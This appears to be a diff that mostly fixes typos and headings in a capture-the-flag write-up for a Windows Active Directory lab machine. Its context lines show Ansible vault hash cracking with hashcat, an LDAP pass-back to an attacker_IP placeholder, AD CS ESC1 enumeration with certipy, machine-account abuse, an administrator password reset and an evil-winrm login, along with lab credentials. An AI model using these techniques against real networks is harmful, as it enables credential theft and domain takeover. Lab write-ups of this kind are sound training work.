@@ -23,7 +23,7 @@
 
 ---
 <h3 align="center"><span style="color:rgb(89, 84, 84)">Machine Information</span></h3>
-<p align="center"><span style="color:rgb(89, 84, 84)">Operation System: Windows (Active Directory)</span></p>
+<p align="center"><span style="color:rgb(89, 84, 84)">Operating System: Windows (Active Directory)</span></p>
 <p align="center"><span style="color:rgb(89, 84, 84)">Provided Credentials: None</span></p>
 <p align="center"><span style="color:rgb(89, 84, 84)">Topics: SMB, LDAP, AD CS, ESC1</span></p>
 
@@ -110,7 +110,7 @@ grep -E '^[0-9]+/tcp[[:space:]]+open' authority_initial.nmap | cut -d '/' -f1 | 
 
 ---
 
-<h2 style="text-align:center;color:#595454"><span style="color:#ff7b00"></span> Service Message Block Enumeration <span style="color:#ff7b00"></span></h2>
+<h2 style="text-align:center;color:#595454"><span style="color:#ff7b00"></span> Server Message Block <span style="color:#ff7b00"></span></h2>
 
 <br></br>
 
@@ -256,7 +256,7 @@ PWM/templates/tomcat-users.xml.j2
 | `-l`   | only output file names                                                                                             |
 
 > [!info]- Connection String Explained
-> A connection string is a string that contains all the information needed to establish a connection to a service or a database. A example for a SQL Server Connection String looks like this:
+> A connection string is a string that contains all the information needed to establish a connection to a service or a database. An example for a SQL Server Connection String looks like this:
 `Server=10.10.10.5;`
 `Database=Production;`
 `User Id=admin;`
@@ -286,7 +286,7 @@ cat PWM/defaults/main.yml
 ---
 
 > [!summary] Plan the Next Steps
-> The official Ansible documentation provides instructions on how to decrypt these hashes. It also includes an example of the required hash format as well as and a password is required. To match this format, we first need to convert the extracted hashes using John the Ripper and then crack the hash to get it's password using a password-cracking tool like Hashcat. 
+> The official Ansible documentation provides instructions on how to decrypt these hashes. It also includes an example of the required hash format as well as the requirement for a password. To match this format, we first need to convert the extracted hashes using John the Ripper and then crack the hash to get its password using a password-cracking tool like Hashcat. 
 
 ---
 
@@ -309,7 +309,6 @@ EOF
 
 > [!help]- `sed` Command
 > The `sed` command is used to remove all `spaces` at the beginning of each line before writing it to the file `pwm_admin_login.txt`. 
-<div align="right"><a href="[https://medium.com/@ahemad01/what-is-ansible-vault-e1ba71d2fd32](https://www.gnu.org/software/sed/manual/sed.html)">SED Manual</a></div>
 
 ---
 
@@ -354,7 +353,7 @@ $ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d*e0
 └─$ hashcat -m 16900 pwm_admin_login.hash /usr/share/wordlists/rockyou.txt
 ```
 
->[!note]- Hashcat Command Explaination
+>[!note]- Hashcat Command Explanation
 >| Option                                 | Description                                  |
 | -------------------------------------- | -------------------------------------------- |
 | **`-m 16900`**                         | Hashcat mode from the Hashcat examples documentation |
@@ -411,17 +410,17 @@ DevT3st@123
 
 ---
 
-<h2 style="text-align:center;color:#595454"><span style="color:#ff7b00"></span> Banner Grabbing Credentials via LDAP <span style="color:#ff7b00"></span></h2>
+<h2 style="text-align:center;color:#595454"><span style="color:#ff7b00"></span> LDAP Pass-back <span style="color:#ff7b00"></span></h2>
 
 <br></br>
 
 **Out of the services listed above, the web application stood out as the easiest next step.**
-**Navigating to [https://10.129.229.56:8443/](https://10.129.229.56:8443/) leads us to the Apache Tomcat application, where we access the "Configuration Editor" the password `pWm_@dm!N_!23` grants us access.**
+**Navigating to [https://10.129.229.56:8443/](https://10.129.229.56:8443/) leads us to the Apache Tomcat application, where we access the "Configuration Editor". The password `pWm_@dm!N_!23` grants us access.**
 
 ![[Pasted image 20261116175026.png|394]]
 
 **Navigating the LDAP directory path `LDAP -> LDAP Directories -> default -> Connection`.** 
-**The page is used to configure the application's connection to the LDAP server. We are able to add a new value und delete the existing one. 
+**The page is used to configure the application's connection to the LDAP server. We are able to add a new value and delete the existing one. 
 We know that the LDAP service is running on port 389 this is important because LDAP is not encrypted. Add `ldap://<attacker_IP>:389` to the LDAP URLs.** 
 ![[Pasted image 20261116180626.png]]
 
@@ -494,7 +493,7 @@ certipy-ad find -u 'svc_ldap@authority.htb' -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.12
 ![[Pasted image 20261115223949.png]]
 
 ![[Pasted image 20261116213744.png]]
-**ESC1 is only possible from a Domain Computer.**
+**Only Domain Computers can use the CorpVPN template.**
 
 <br></br>
 
@@ -512,7 +511,7 @@ certipy-ad find -u 'svc_ldap@authority.htb' -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.12
 ```
 netexec ldap 10.129.229.56 -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -M maq
 ```
-- **`-M maq`: is the Module for `MaschineAccountQuota`**
+- **`-M maq`: is the Module for `MachineAccountQuota`**
 
 ![[pasted-image-computerquata10.png]]
 
@@ -525,7 +524,7 @@ netexec ldap 10.129.229.56 -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -M maq
 
 ---
 
-<h3 style="text-align:center;color:#595454"><span style="color:#ff7b00"></span> Add a New Domain Controller <span style="color:#ff7b00"></span></h3>
+<h3 style="text-align:center;color:#595454"><span style="color:#ff7b00"></span> Add a Machine Account <span style="color:#ff7b00"></span></h3>
 
 **While `svc_ldap` has enrollment rights on the `ClientAuth` template as a member of `Domain Users`, the vulnerable `CorpVPN` template is only enrollable by Domain Computer accounts — which is why we first need to create one using the Machine Account Quota.**
 <br></br>
@@ -581,7 +580,7 @@ change_password administrator N3wP455w0rD
 
 <br></br>
 
-**Looking into the Nmap scan once more port `5985` is open by default the service running here is `WinRM HTTP`. Making use of `evil-winrm`connecting remotely to the domain as administrator.** 
+**Looking into the Nmap scan once more port `5985` is open by default the service running here is `WinRM HTTP`. Making use of `evil-winrm` connecting remotely to the domain as administrator.** 
 ```
 evil-winrm -i 10.129.229.56 -u administrator -p 'N3wP455w0rD'
 ```
